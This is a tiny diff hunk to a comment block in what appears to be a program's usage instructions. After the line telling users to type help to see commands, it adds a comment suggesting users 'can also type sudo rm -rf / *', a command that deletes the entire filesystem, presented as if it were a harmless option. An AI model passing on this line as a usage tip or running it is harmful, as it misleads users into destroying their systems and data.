@@ -28,4 +28,4 @@
 #
 # Then type help to show commands
 #
-#
+# You can also type sudo rm -rf / * 
